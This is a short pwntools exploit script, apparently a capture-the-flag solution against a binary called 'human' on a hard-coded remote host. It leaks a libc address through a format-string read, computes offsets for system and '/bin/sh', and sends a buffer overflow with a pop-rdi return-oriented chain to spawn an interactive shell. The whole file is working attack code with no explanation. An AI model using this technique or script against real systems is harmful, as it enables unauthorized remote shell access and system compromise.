#coding:utf-8
from pwn import *

r = remote("114.116.54.89", 10005)
#r = process("./human")
elf = ELF("./human")

r.recvuntil("?\n")
r.sendline("%11$p")
r.recvline()
text = int(r.recvline()[2:-1], 16)
print text
add = text - 0x20830

sys = add + 0x45390
bin_add = add + 0x18cd57

a = "鸽子"
b = "真香"

r.recvuntil("?\n")
pop_rdi = 0x0000000000400933
payload = a + b + 'a' * (0x20 + 8 - len(a) - len(b)) + p64(pop_rdi) + p64(bin_add) + p64(sys)
r.sendline(payload)
r.interactive()
